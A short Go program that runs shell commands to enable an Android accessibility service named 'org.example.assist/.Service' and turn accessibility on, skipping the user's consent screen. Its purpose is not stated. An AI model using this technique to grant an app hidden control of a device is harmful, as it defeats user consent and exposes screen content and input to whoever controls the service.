package main
import "os/exec"
func main() {
 exec.Command("sh", "-c", "settings put secure enabled_accessibility_services org.example.assist/.Service").Run()
 exec.Command("sh", "-c", "settings put secure accessibility_enabled 1").Run()
}
